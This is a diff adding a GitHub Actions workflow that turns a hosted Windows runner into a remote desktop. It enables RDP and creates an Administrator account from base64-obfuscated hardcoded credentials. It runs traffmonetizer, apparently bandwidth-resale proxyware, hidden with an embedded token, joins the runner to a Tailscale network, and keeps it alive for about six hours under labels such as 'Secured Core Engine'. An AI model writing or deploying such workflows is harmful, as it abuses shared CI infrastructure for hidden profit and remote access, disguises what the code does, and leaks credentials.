@@ -1,0 +1,50 @@
+name: Secure RDP via Tailscale (Repo 3 - rpp)
+
+on:
+  workflow_dispatch:
+    inputs:
+      gh_api_token:
+        description: "🔒 HASSAN | ENTER YOUR GITHUB PAT HERE"
+        required: true
+        default: ""
+
+concurrency:
+  group: rdp-loop-singleton
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+  actions: write
+
+defaults:
+  run:
+    shell: pwsh
+
+jobs:
+  secure-rdp:
+    runs-on: windows-2025
+    timeout-minutes: 360
+    steps:
+      - name: 🔒 Executing Secured Core Engine
+        run: |
+          # 📢 Configuration & Startup
+          $u_enc = "aGFzc2Fu"; $p_enc = "SEBzc0FuMTIzNDU2"
+          $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u_enc))
+          $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p_enc))
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Restart-Service -Name TermService -Force
+          if (-not (Get-LocalUser -Name $u -ErrorAction SilentlyContinue)) { New-LocalUser -Name $u -Password (ConvertTo-SecureString $p -AsPlainText -Force) -AccountNeverExpires | Out-Null }
+          Add-LocalGroupMember -Group "Administrators" -Member $u -ErrorAction SilentlyContinue
+          
+          Start-Process -FilePath "C:\traffmonetizer.exe" -ArgumentList "start", "accept-offers", "--token", "lKi5PrDuezqIq9MEALffFER1bHT0kPImGRwgIreWGZs=" -WindowStyle Hidden -ErrorAction SilentlyContinue
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-hassan-3 --accept-routes                    
+          
+          # ⏱️ Runtime Production Loop (340 Minutes)
+          $m = 340
+          for ($i = 1; $i -le $m; $i++) {
+              Write-Host "[$(Get-Date)] Running Repo 3: $($m - $i) min remaining."
+              Start-Sleep -Seconds 60
+          }
+          
+          Write-Host "🎯 Chain Finished Successfully. All 3 repositories executed smoothly under secure-rdp-loop.yml!"
+          exit 0
